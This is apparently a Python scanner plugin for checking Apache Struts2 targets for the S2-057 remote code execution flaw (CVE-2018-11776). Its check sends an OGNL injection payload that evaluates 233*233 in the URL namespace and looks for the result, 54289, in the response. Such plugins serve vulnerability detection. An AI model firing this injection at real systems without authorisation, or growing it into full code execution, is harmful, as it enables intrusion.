# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Apache_Struts_0017_p'  # 平台漏洞编号，留空
    name = 'Apache Struts2 S2-057远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2018-08-22'  # 漏洞公布时间
    desc = '''
        Struts2是Apache软件基金会负责维护的一个基于MVC设计模式的Web应用框架开源项目。
        Apache Struts2存在S2-057远程代码执行漏洞。漏洞触发条件：1、定义XML配置时namespace值未设置且上层动作配置（Action Configuration）中未设置或用通配符namespace。2、url标签未设置value和action值且上层动作未设置或用通配符namespace。攻击者可利用漏洞执行RCE攻击。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-15894'  # 漏洞来源
    cnvd_id = 'CNVD-2018-15894'  # cnvd漏洞编号
    cve_id = 'CVE-2018-11776'  # cve编号
    product = 'Apache-Struts'  # 漏洞应用名称
    product_version = 'Apache Struts2 >=2.3，<=2.3.34 Apache Struts2 >=2.5，<=2.5.16'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '46f3b44b-e25c-44fe-9a12-2ecd075ab7a8'
    author = '国光'  # POC编写者
    create_date = '2018-08-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:

            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "../../$%7B233*233%7D/{action_url}".format(action_url=self.target.split("/")[-2])
            vurl_url = self.target + payload
            request = requests.get(vurl_url)
            if '54289' == request.url.split("/")[-2]:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
